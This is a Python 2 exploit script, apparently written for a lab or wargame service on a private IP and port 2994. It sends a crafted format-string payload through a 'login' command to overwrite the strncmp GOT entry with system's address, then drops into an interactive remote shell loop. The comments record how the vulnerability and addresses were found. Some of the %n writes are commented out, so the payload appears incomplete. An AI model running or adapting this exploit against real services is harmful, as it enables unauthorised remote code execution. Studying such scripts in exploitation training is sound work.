#!/usr/bin/python
import struct
import socket


# Configurations
#
# hex(68+108+79+46829)
#  Overwrite With 0xb7ecffb0 [system]

got    = 0x0804a1a8 # Where We want to right [strncmp]


payload = 'AAA\xa8\xa1\x04\x08%x%21$x'

payload = 'AAA'
payload += struct.pack("i", got)
payload += struct.pack("i", got+1)
payload += struct.pack("i", got+2)

# 000000b0 
payload += "%108x"
payload += "%21$n"
# 0000ffb0
payload += "%79x"
#payload += "%22$n"
# b7ecffb0
payload += "%46829x"
#payload += "%23$n"


print [payload], len(payload)


### Testing #########
#
# Found format string vulnerability
#
# After Inserting Username 
#
# login AAABBBB%21$x  [BBBB is our targeted Address ]
#     AAA\xa8\xa1\x04\x08
# # Strncmp GOT Entry Address : 0804a1a8
#
#
# Username variable Starting Point 0x804a240


# Victim Configuration
PORT = 2994
HOST = "192.168.56.101"


# Create Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# Connect Socket 
s.connect((HOST, PORT))

s.settimeout(2.0)
print s.recv(1024)
s.send("username suraj\n")
print s.recv(1024)
s.send("login "+str(payload)+"\n")
try:
	while True:
		print s.recv(1024),
		s.send(raw_input(':~# ')+'\n')

except Exception as E:
	print "Error ", E
	s.close()
print "Closing socket"
s.close()



